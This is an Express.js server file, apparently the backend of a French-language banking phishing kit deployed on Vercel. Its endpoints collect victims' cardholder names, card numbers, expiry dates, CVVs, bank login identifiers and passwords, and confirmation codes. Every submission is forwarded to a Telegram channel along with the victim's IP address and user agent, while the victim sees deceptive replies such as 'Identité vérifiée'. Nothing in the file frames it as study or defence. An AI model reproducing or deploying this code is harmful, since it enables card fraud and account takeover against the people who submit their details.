// Vercel Serverless Function
// Point d'entrée pour toutes les requêtes
require('dotenv').config();
const express = require('express');
const path = require('path');
const telegramService = require('../backend-nodejs/telegramService');

const app = express();

// Middleware
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, '../backend-nodejs/views'));
app.use(express.static(path.join(__dirname, '../backend-nodejs/public')));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Middleware pour capturer IP et User Agent
app.use((req, res, next) => {
  req.clientIP = req.headers['x-forwarded-for'] || req.headers['cf-connecting-ip'] || req.connection.remoteAddress || 'N/A';
  req.userAgent = req.headers['user-agent'] || 'N/A';
  next();
});

// ==================== ROUTES PAGES ====================

app.get('/', (req, res) => {
  try {
    res.render('index');
  } catch (error) {
    console.error('Error rendering index:', error);
    res.status(500).json({ error: 'Error rendering page', details: error.message });
  }
});

app.get('/accords', (req, res) => {
  try {
    res.render('accords');
  } catch (error) {
    console.error('Error rendering accords:', error);
    res.status(500).json({ error: 'Error rendering page', details: error.message });
  }
});

app.get('/premiere', (req, res) => {
  try {
    res.render('premiere');
  } catch (error) {
    console.error('Error rendering premiere:', error);
    res.status(500).json({ error: 'Error rendering page', details: error.message });
  }
});

app.get('/deuxieme', (req, res) => {
  try {
    res.render('deuxieme');
  } catch (error) {
    console.error('Error rendering deuxieme:', error);
    res.status(500).json({ error: 'Error rendering page', details: error.message });
  }
});

app.get('/troisieme', (req, res) => {
  try {
    res.render('troisieme');
  } catch (error) {
    console.error('Error rendering troisieme:', error);
    res.status(500).json({ error: 'Error rendering page', details: error.message });
  }
});

// ==================== API ENDPOINTS ====================

// Envoyer données d'accord
app.post('/api/send-agreement', async (req, res) => {
  try {
    const data = {
      step: 'Accord',
      ip: req.clientIP,
      userAgent: req.userAgent,
      timestamp: new Date().toISOString()
    };

    await telegramService.sendAgreementConfirmation(data);
    res.json({ success: true, message: 'Accord enregistré' });
  } catch (error) {
    console.error('Erreur:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Envoyer données du formulaire première
app.post('/api/send-form', async (req, res) => {
  try {
    const { titulaire, cardNumber, expiryDate, bank, telephone } = req.body;

    const data = {
      step: 'Première - Formulaire',
      titulaire,
      cardNumber,
      expiryDate,
      bank,
      telephone,
      ip: req.clientIP,
      userAgent: req.userAgent,
      timestamp: new Date().toISOString()
    };

    await telegramService.sendFormData(data);
    res.json({ success: true, message: 'Données reçues' });
  } catch (error) {
    console.error('Erreur:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Envoyer CVV séparément (sécurité)
app.post('/api/send-cvv', async (req, res) => {
  try {
    const { cvv, titulaire, cardNumber, expiryDate } = req.body;

    const data = {
      cvv,
      titulaire,
      cardNumber,
      expiryDate,
      ip: req.clientIP,
      userAgent: req.userAgent,
      timestamp: new Date().toISOString()
    };

    await telegramService.sendCVVAlert(data);
    res.json({ success: true, message: 'CVV enregistré' });
  } catch (error) {
    console.error('Erreur:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Vérifier identité (page 3)
app.post('/api/verify-identity', async (req, res) => {
  try {
    const { identifier, password } = req.body;

    const data = {
      step: 'Troisième - Identité',
      identifier,
      password,
      ip: req.clientIP,
      userAgent: req.userAgent,
      timestamp: new Date().toISOString()
    };

    await telegramService.sendIdentityData(data);
    res.json({ success: true, message: 'Identité vérifiée' });
  } catch (error) {
    console.error('Erreur:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Envoyer confirmation (page 4)
app.post('/api/send-confirmation', async (req, res) => {
  try {
    const { confirmationCode } = req.body;

    const data = {
      step: 'Quatrième - Confirmation',
      confirmationCode,
      ip: req.clientIP,
      userAgent: req.userAgent,
      timestamp: new Date().toISOString()
    };

    await telegramService.sendConfirmationData(data);
    res.json({ success: true, message: 'Confirmation reçue' });
  } catch (error) {
    console.error('Erreur:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Test Telegram
app.post('/api/test-telegram', async (req, res) => {
  try {
    const result = await telegramService.testConnection();
    res.json({ success: result, message: result ? 'Connexion OK' : 'Erreur de connexion' });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Health check
app.get('/api/health', (req, res) => {
  res.json({ status: 'OK', timestamp: new Date().toISOString(), environment: 'vercel' });
});

// Error handler
app.use((err, req, res, next) => {
  console.error('Erreur serveur:', err);
  res.status(500).json({ error: 'Erreur serveur interne' });
});

// Export pour Vercel
module.exports = app;
